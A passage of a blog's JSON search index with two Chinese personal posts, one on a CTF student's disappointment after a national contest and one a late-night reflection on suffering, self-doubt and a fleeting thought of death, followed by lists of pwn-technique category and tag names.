虽然我本身就对这个比赛没有什么过高的期待，但是确实还是非常失望。非常失望。 可能我之前在buu上面刷的19年的题确实过于简单了，让我产生了“今年也会如此”的感觉。事实上这种不切实际的想法在我比赛前夕刷知乎看去年师傅们对于2020年的比赛的吐槽时就已经有所坍塌，只是当现实确实如此的时候，还是会觉得非常失望。 现在我的心理压力事实上是不亚于高三时期的。虽然这个事情从侧面反映出我高三也不是绝对认真就是了。高三的时候虽然学习学科知识感到很恶心，但是我还是努力去学了，是考不上心仪大学给我带来的极大的压力。现在倒是没有什么“不做就会死”的压力了，但是我其实明白现在还是很关键的一段时期，我和学校同级学生最好的那一批的起跑线是相当的，只要我足够努力，我就可以超过他们，实际上不管哪个时期都是一种正反馈机制。只不过驱动力是不同的，虽然本质上都是外力。 但是一场国赛给我整破防了。 就和看到国际学院学生和计算机通信学院学生的差距一样，我看到了我们学校与所谓强校的差距。 这是无法跨越的鸿沟。 前十队伍除了航电成信，清一色985.而我们学校，强如大四的学长，或者学委，都只能靠边站。 这种差距让我不禁觉得好像只站在这个学校的巅峰并不是一件值得高兴的事情。 大学越读越让我觉得，大学的环境真的特别重要。一年前我宁愿在南邮读信安，也不愿去北邮读扫地专业。但是现在我宁愿读扫地专业，只要我能上北邮。 更好的大学，确实意味更多机会。当然你肯定要足够强才能竞争这个机会。 但是如果全身心投入进去，怎么可能弱？ 但是无妨，冲就完事了。学习环境再好还不是靠网上教程？我这种孤儿也不喜欢问别人什么东西的。 加油吧。在强网杯之前学好heap漏洞。 在暑假考核之前学习trick。 暑假的话用两个月补一下开发和算法。（ps：开学加个移动开发部？？？）","categories":[{"name":"深夜高速","slug":"深夜高速","permalink":"https://fuurinko.github.io/categories/%E6%B7%B1%E5%A4%9C%E9%AB%98%E9%80%9F/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"1","slug":"深夜高速-1","date":"1919-08-09T15:34:14.000Z","updated":"2022-03-23T03:16:40.020Z","comments":true,"path":"1919/08/10/深夜高速-1/","link":"","permalink":"https://fuurinko.github.io/1919/08/10/%E6%B7%B1%E5%A4%9C%E9%AB%98%E9%80%9F-1/","excerpt":"","text":"​ 0:​ 写下这些话的时候，不知不觉地，已经半夜两点了。 ​ 其实放在半个月之前的我看来，两点根本不是半夜，而是夜生活的开始。然而仅仅十五天，我将作息强行向前延伸了两小时，所以对于现在的我来说，两点已经是高程度的熬夜了。 ​ 熬夜并不是一件坏事，至少我如今也这么认为——只要不是因为玩手机等无意义的事情而浪费生命。 ​ 最近的我一直在经受苦难，或者说，我一直认为我在经受别人未曾经受的苦难。这份苦难深沉而难以被他人理解，这份苦难是独属于我的宝藏。 ​ 我珍视这样的宝藏——我将它视若使我独立于其他人的，高傲的资本，即使它本质上只是一种普通的苦难。我似乎沉醉于享受苦难了。享受苦难，多么滑稽，但是这是确乎发生的事情。 ​ 古往今来，享受苦难的人从来不会获得胜利，英雄从来视苦难为眼前的敌人，即使苦难要伴随他多年，但他必然不会爱上苦难。 ​ 正确的思维不会将痛苦的过程当做自我价值的完成，只有虚荣的心才会如此感想。 ​ 既然人没有真正喜爱的东西，那只有被人喜爱，才能使他满足，因此人生快意的来源，统统来自他人的赞赏，一旦赞赏减少，甚至消失，他也就消失了，于是他开始自我陶醉，但是又有什么能够陶醉呢？明明一事无成？ ​ 一事无成？并不全对，他还有一大把苦难，值得他去品味。 ​ 这样的个体，完全由虚荣构成，任何表现出来的，他所喜爱的事情，只不过是让社会接纳他的借口。 ​ 当我意识到这一点时，自然而然地会辩解：“那么，是不是所有人其实都没有真正喜欢的事情呢？” ​ 曾经我是坚信这一点的，但是我没有领会其中的微妙。 ​ 我无意探讨人类科学或者社会准则，我只是想写下我的愚蠢。我以为大家都没有心之所向，殊不知我只是个思维简单的二极管。这件事并不是非黑即白的，我们可以拥有并不是真心喜欢的东西，但是其中“真心喜欢”有几分，“不真心喜欢”又有几分？ ​ 这是一个很难界定的问题。 1:​ 前些日子，感觉提不起劲头，直到听说对面寝室楼有姐姐跳楼，心情一下变得非常复杂。 ​ 之所以复杂，是因为那时，我第一次完整地理解了决定轻生的人的心情。 ​ 活着的盼头，很难找到，但很容易就消失得一干二净了。第一次有死亡的念头，虽然念头维持的时间确实是一瞬即逝的，但是情绪还是在一瞬间爆发了。 ​ 虽然现在已经暂时找到了努力的方向，但是曾经挂在我心里明晃晃的太阳遮了大半。 ​ 然后我尝试与他人交流，不断地在意别人对于这件事情的看法，几天下来，我对自己的评价是：“太脆弱。” ​ 这几天，最触动的话是 “这世界上大部分的人都在经受苦难，那么多人，都扛下去了，你凭什么不能”，来源于刘畅两年前的周三电台。张麻子也给我讲了学校一个朋友高中练习电吉他的事，说他每天晚上为了躲避家人，从两点练琴到四点，并且没有耳机，更没有音箱。 ​ 接着我又想到高中时那些搞基础学科竞赛的同学，诸如此类的例子太多了，难道我经受的痛苦就一定比他们更加深，更加难以摆脱吗。 ​ 我还是一个太过脆弱的人，我过度放大苦难，并将苦难视为伴随我身体生存的共生体，既然不能从胜利中获得满足，那就从失败中获得满足。 ​ 这是我人生十几年，从各种离奇的环境中，生长出的畸形的心理缓解措施，我现在知道，这样的心情都是被刻意勾画出来的，严重程度尚不至此。虽然此时此刻我的心情依旧是抑郁的，但是我应当劝说自己。 2:​ 聊完了我对于苦难的态度，再来聊聊苦难本身吧。 ​ 我觉得这些困难，并不来源于身体上的劳累——这些其实是最不值一提的，一般的人都不会在这一步上摔倒。 ​ 困难多来自于自我否定，与外界环境的压力。换句话说，更多的是走不出心理上的低谷。 ​ 这件事确实十分离奇，一不下心就会陷入无限的正反馈，要么成绩变差，然后不断被周围的人唾弃，然后成绩更差，或者成绩变好，为了维持住周围人的赞扬，于是更加努力。 ​ 为了打破这样的循环，破局之处在于正反馈形成的逻辑。成绩的好坏有时候并不是个体更够完全掌控的事情，而能控制的环节，是“我”对于他人看法的回应。我完全可以不在意他人的看法，毕竟不管我当前怎样，与最后结果判定时的成绩关系并不紧密。 ​ 但是这往往是比闭着眼睛努力更难的事。一直以来，总有人说，在面试，考试等场景下，心态会比实力更重要。虽然我并不完全认同，但是如果在这话前加一些前置条件，就说得通了，比如说“整个学习过程中的心态” ​ 从各种方面已经展示了我极为差劲的心理素质，怎么改善，我应该去好好思考。 ​ ​ ​","categories":[{"name":"深夜高速","slug":"深夜高速","permalink":"https://fuurinko.github.io/categories/%E6%B7%B1%E5%A4%9C%E9%AB%98%E9%80%9F/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]}],"categories":[{"name":"HEAP - Off By One","slug":"HEAP-Off-By-One","permalink":"https://fuurinko.github.io/categories/HEAP-Off-By-One/"},{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"},{"name":"HEAP","slug":"HEAP","permalink":"https://fuurinko.github.io/categories/HEAP/"},{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"},{"name":"HEAP - House Of Force","slug":"HEAP-House-Of-Force","permalink":"https://fuurinko.github.io/categories/HEAP-House-Of-Force/"},{"name":"STACK - ret2shellcode","slug":"STACK-ret2shellcode","permalink":"https://fuurinko.github.io/categories/STACK-ret2shellcode/"},{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"},{"name":"Generalization","slug":"Generalization","permalink":"https://fuurinko.github.io/categories/Generalization/"},{"name":"STACK - Stack Overflow","slug":"STACK-Stack-Overflow","permalink":"https://fuurinko.github.io/categories/STACK-Stack-Overflow/"},{"name":"STACK - OTHERS","slug":"STACK-OTHERS","permalink":"https://fuurinko.github.io/categories/STACK-OTHERS/"},{"name":"STACK - Format","slug":"STACK-Format","permalink":"https://fuurinko.github.io/categories/STACK-Format/"},{"name":"STACK - DynELF","slug":"STACK-DynELF","permalink":"https://fuurinko.github.io/categories/STACK-DynELF/"},{"name":"STACK - ARRAY OUT OF BOUNDS","slug":"STACK-ARRAY-OUT-OF-BOUNDS","permalink":"https://fuurinko.github.io/categories/STACK-ARRAY-OUT-OF-BOUNDS/"},{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/categories/mess/"},{"name":"HEAP-Unsortedbin","slug":"HEAP-Unsortedbin","permalink":"https://fuurinko.github.io/categories/HEAP-Unsortedbin/"},{"name":"HEAP - UNLINK","slug":"HEAP-UNLINK","permalink":"https://fuurinko.github.io/categories/HEAP-UNLINK/"},{"name":"CSAPP LAB","slug":"CSAPP-LAB","permalink":"https://fuurinko.github.io/categories/CSAPP-LAB/"},{"name":"STACK - ROP","slug":"STACK-ROP","permalink":"https://fuurinko.github.io/categories/STACK-ROP/"},{"name":"STACK - sandbox","slug":"STACK-sandbox","permalink":"https://fuurinko.github.io/categories/STACK-sandbox/"},{"name":"STACK - SROP","slug":"STACK-SROP","permalink":"https://fuurinko.github.io/categories/STACK-SROP/"},{"name":"HEAP - Tcache","slug":"HEAP-Tcache","permalink":"https://fuurinko.github.io/categories/HEAP-Tcache/"},{"name":"OTHER - IO FILE","slug":"OTHER-IO-FILE","permalink":"https://fuurinko.github.io/categories/OTHER-IO-FILE/"},{"name":"STACK - ret2dlsolve","slug":"STACK-ret2dlsolve","permalink":"https://fuurinko.github.io/categories/STACK-ret2dlsolve/"},{"name":"深夜高速","slug":"深夜高速","permalink":"https://fuurinko.github.io/categories/%E6%B7%B1%E5%A4%9C%E9%AB%98%E9%80%9F/"}],"tags":[{"name":"offbyone","slug":"offbyone","permalink":"https://fuurinko.github.io/tags/offbyone/"},{"name":"heap","slug":"heap","permalink":"https://fuurinko.github.io/tags/heap/"},{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"},{"name":"hof","slug":"hof","permalink":"https://fuurinko.github.io/tags/hof/"},{"name":"UAF","slug":"UAF","permalink":"https://fuurinko.github.io/tags/UAF/"},{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"},{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"},{"name":"summary","slug":"summary","permalink":"https://fuurinko.github.io/tags/summary/"},{"name":"EZ_STACK","slug":"EZ-STACK","permalink":"https://fuurinko.github.io/tags/EZ-STACK/"},{"name":"ret2csu","slug":"ret2csu","permalink":"https://fuurinko.github.io/tags/ret2csu/"},{"name":"FMT","slug":"FMT","permalink":"https://fuurinko.github.io/tags/FMT/"},{"name":"DynELF","slug":"DynELF","permalink":"https://fuurinko.github.io/tags/DynELF/"},{"name":"ret2gadgets","slug":"ret2gadgets","permalink":"https://fuurinko.github.io/tags/ret2gadgets/"},{"name":"coffee","slug":"coffee","permalink":"https://fuurinko.github.io/tags/coffee/"},{"name":"逆向","slug":"逆向","permalink":"https://fuurinko.github.io/tags/%E9%80%86%E5%90%91/"},{"name":"heap_pro","slug":"heap-pro","permalink":"https://fuurinko.github.io/tags/heap-pro/"},{"name":"csapp lab","slug":"csapp-lab","permalink":"https://fuurinko.github.io/tags/csapp-lab/"},{"name":"SRE","slug":"SRE","permalink":"https://fuurinko.github.io/tags/SRE/"},{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"},{"name":"linux primary","slug":"linux-primary","permalink":"https://fuurinko.github.io/tags/linux-primary/"},{"name":"pwntools","slug":"pwntools","permalink":"https://fuurinko.github.io/tags/pwntools/"},{"name":"gdb","slug":"gdb","permalink":"https://fuurinko.github.io/tags/gdb/"},{"name":"pwn Primary","slug":"pwn-Primary","permalink":"https://fuurinko.github.io/tags/pwn-Primary/"},{"name":"Heap","slug":"Heap","permalink":"https://fuurinko.github.io/tags/Heap/"},{"name":"io_file","slug":"io-file","permalink":"https://fuurinko.github.io/tags/io-file/"}]}